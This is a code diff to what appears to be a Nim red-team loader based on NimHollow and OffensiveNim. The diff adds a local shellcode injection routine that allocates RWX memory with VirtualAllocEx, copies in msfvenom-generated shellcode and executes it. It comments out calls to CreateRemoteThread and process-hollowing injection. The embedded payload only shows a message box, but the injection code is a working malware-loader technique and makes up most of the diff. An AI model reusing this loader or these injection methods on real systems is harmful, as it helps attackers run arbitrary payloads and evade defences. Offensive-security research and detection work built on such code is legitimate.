@@ -12,6 +12,8 @@
         - NimHollow by snovvcrash (@snovvcrash)
 ]#
 
+import winim/lean
+
 # Syscalls
 import syscalls/GetSyscallStub
 
@@ -100,7 +102,8 @@ when isMainModule:
             # implementing any sort of shellcode encryption yet!
 
             # msfvenom -p windows/x64/messagebox -e x64/xor_dynamic TITLE='THE GIBSON' TEXT='Hack the Planet!' EXITFUNC=thread -f csharp
-            var shellcode: array[373, byte] = [
+            const shellcode_length: int = 373
+            var shellcode: array[shellcode_length, byte] = [
             byte 0xeb,0x27,0x5b,0x53,0x5f,0xb0,0x75,0xfc,0xae,0x75,0xfd,0x57,0x59,0x53,0x5e,
             0x8a,0x06,0x30,0x07,0x48,0xff,0xc7,0x48,0xff,0xc6,0x66,0x81,0x3f,0x82,0x54,
             0x74,0x07,0x80,0x3e,0x75,0x75,0xea,0xeb,0xe6,0xff,0xe1,0xe8,0xd4,0xff,0xff,
@@ -127,8 +130,45 @@ when isMainModule:
             0x77,0x7f,0x34,0x60,0x7c,0x71,0x34,0x44,0x78,0x75,0x7a,0x71,0x60,0x35,0x14,
             0x40,0x5c,0x51,0x34,0x53,0x5d,0x56,0x47,0x5b,0x5a,0x14,0x82,0x54]
 
+            # -----------------------------------------------------------------------------------------------
+            # INJECTION
+            # -----------------------------------------------------------------------------------------------
+
+            # Local Injection
+            # Source: https://github.com/byt3bl33d3r/OffensiveNim/pull/29/commits/5b1eeccca6a2bc5fd26a8e893a01656f0c7c9ade
+            let tProcess = GetCurrentProcessId()
+            var pHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess)
+
+            var shellcodePtr: ptr = (cast[ptr array[shellcode_length, byte]](addr shellcode[0]))
+
+            echo "[localInject] Local PID: ", tProcess
+            echo "[localInject] Allocating ", shellcode_length, " bytes of memory as RWX..."
+
+            let rPtr = VirtualAllocEx(
+                pHandle,
+                NULL,
+                cast[SIZE_T](shellcode_length),
+                MEM_COMMIT,
+                PAGE_EXECUTE_READ_WRITE
+            )
+
+            echo "[localInject]: Copying shellcode to newly allocated memory..."
+            copyMem(rPtr, shellcodePtr, shellcode_length)
+
+            echo "[localInject]: Executing shellcode..."
+            let f = cast[proc(){.nimcall.}](rPtr)
+            f()
+
+            # VirtualAlloc
+            # RtlMoveMemory
+            # VirtualProtect
+            # CreateThread
+
             # CreateRemoteThread Example
-            injectCreateRemoteThread(shellcode)
+            # injectCreateRemoteThread(shellcode)
             
             # Process Hollowing Example
-            injectProcessHollowing(shellcode)
+            # injectProcessHollowing(shellcode)
+
+            # RunPE Example
+            # import injection/runPE
